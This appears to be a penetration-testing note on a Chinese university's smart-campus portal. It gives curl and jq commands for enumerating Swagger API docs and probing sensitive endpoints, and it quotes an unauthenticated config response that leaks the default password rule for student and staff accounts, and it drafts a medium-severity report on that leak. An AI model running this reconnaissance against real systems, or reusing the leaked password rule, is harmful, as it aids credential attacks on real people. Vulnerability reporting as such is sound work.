# BZUU rhpt smart-campus Swagger and getAppConfig medium-boundary finding (2026-05-24)

## Scope

Target: `bzuu.edu.cn` / `oshall.bzuu.edu.cn` after the earlier go-fastdfs/fileServer root cause was considered non-actionable for the user's current goal. The goal was to find a new reportable root cause, accepting medium severity if it had practical impact.

Evidence workspaces from the session:

```text
/tmp/bzuu_logic_20260524_1807
/tmp/bzuu_new_medium_20260524
```

Key files:

```text
/tmp/bzuu_logic_20260524_1807/swagger/https___oshall_bzuu_edu_cn_zhxyApi_swagger_resources_.body
/tmp/bzuu_logic_20260524_1807/swagger_docs2/rhpt-applets.json
/tmp/bzuu_logic_20260524_1807/swagger_docs2/rhpt-system.json
/tmp/bzuu_new_medium_20260524/open_api_probe/results.tsv
/tmp/bzuu_new_medium_20260524/config_verify/
/tmp/bzuu_new_medium_20260524/final_new_vuln_decision.txt
```

## Discovery pattern

### 1. Swagger resource index is behind the `zhxyApi` prefix

The public doc UI exists at:

```bash
curl -4 --http1.1 -sk -D- 'https://oshall.bzuu.edu.cn/zhxyApi/swagger-resources'
```

Observed `200 application/json` exposing service groups:

```text
/rhpt-interface/v2/api-docs
/rhpt-workhall/v2/api-docs
/rhpt-jimu/v2/api-docs
/rhpt-applets/v2/api-docs
/rhpt-workform/v2/api-docs
/rhpt-system/v2/api-docs
/rhpt-datafill/v2/api-docs
```

Direct `https://oshall.bzuu.edu.cn/rhpt-system/v2/api-docs` returns `302 /zhxy/home`; the correct fetch path is:

```bash
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-system/v2/api-docs'
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-workform/v2/api-docs'
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/v2/api-docs'
```

This is a useful enumeration lead, but API docs alone are not a reportable medium/high vulnerability unless chained to data access or exploitable configuration.

### 2. High-value endpoints to test from rhpt applets/system/workform docs

Extract likely medium/high candidates from Swagger:

```bash
jq -r '.paths | to_entries[]? | .key as $p | .value | to_entries[]? | [.key,$p,(.value.summary//""),((.value.tags//[])|join(",")),((.value.parameters//[])|map((.name//"")+":"+(.in//"")+":"+((.required//false)|tostring)+":"+(.type//(.schema["$ref"]//"")))|join(";"))] | @tsv' rhpt-*.json
```

Prioritize:

```text
/applets/gzff/data                                      工资发放
/applets/synthesis/query/achievement                    学生成绩查询
/applets/synthesis/query/studentPhoneList               学生通讯录
/applets/synthesis/query/teacherPhoneList               教师通讯录
/applets/workhall/api/verificationPhoneAndIdCard        手机号+身份证校验
/applets/week/timetable/studentTimetable                学生课表
/applets/week/timetable/teacherTimetable                教师课表
/rhpt-system/appApi/listServerNode                      服务器节点
/rhpt-system/appApi/listDataBase                        数据源
/rhpt-system/appApi/listDataTables                      数据表
/rhpt-workform/online/cgform/api/getData/{id}           Online 表单数据
/rhpt-interface/zhxyInterfaceApi/getAccessToken         第三方授权 token
```

In this BZUU session, these sensitive APIs returned `401` with `Token失效，请重新登录`, so they were not reportable as unauthorized access.

## Medium-boundary candidate: getAppConfig leaks initial password rule

Endpoint:

```text
https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/applets/synthesis/query/getAppConfig
```

Verification:

```bash
curl -4 --http1.1 -sk -D- 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/applets/synthesis/query/getAppConfig'
```

Observed unauthenticated `200 application/json` containing:

```json
{
  "success": true,
  "message": "操作成功！",
  "code": 200,
  "result": {
    "passwordHint": "登录账号为学号/工号，初始密码规则为：Bzuu@身份证后6位",
    "casUrl": "https://auth.bzuu.edu.cn/authserver/",
    "serviceUrl": "https://oshall.bzuu.edu.cn/zhxyApi/applets/workhall/api/casSucessLogin"
  }
}
```

### False-positive controls

Random API path is not the same response:

```bash
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/__random_hermes_20260524__'
# 404 JSON
```

Neighbor typo path is not the same response:

```bash
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/applets/synthesis/query/getAppConfigXYZ'
# 401 Token失效
```

Same microservice sensitive endpoints are protected:

```bash
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/applets/synthesis/query/studentPhoneList?pageNo=1&pageSize=10'
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/applets/synthesis/query/teacherPhoneList?pageNo=1&pageSize=10'
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/applets/synthesis/query/achievement'
curl -4 --http1.1 -sk 'https://oshall.bzuu.edu.cn/zhxyApi/rhpt-applets/applets/gzff/data'
# all 401 Token失效 in this session
```

## Reporting boundary

This is the best new BZUU candidate from the session, but it is a medium-boundary issue, not a high-risk account takeover proof.

Suggested title:

```text
亳州学院智慧校园小程序配置接口未授权访问泄露统一认证初始密码规则
```

Suggested severity:

```text
中危尝试
```

Impact statement:

- Unauthenticated attackers can learn the CAS/SSO address and the initial password construction rule: `Bzuu@身份证后6位` with username as student/staff number.
- This reduces the cost of credential attacks against accounts that have not changed initial passwords, especially if student/staff numbers and ID-card suffixes are obtained from other leaks.
- Do not claim account takeover unless a real account login is verified under authorization.

Do not submit as:

- Swagger/API docs exposure alone.
- A high-risk vulnerability without account takeover evidence.
- Unauthorized access to salary/grades/contacts; those endpoints were protected by token in this session.

## Reusable lesson

For smart-campus rhpt-style targets, the best medium-grade path after Swagger discovery is not “API docs exposed”, but “public configuration endpoint exposes authentication policy/default password rules”. Always pair it with fallback controls and protected sensitive-endpoint controls to show this is a real unauthenticated config API, not a SPA fallback.
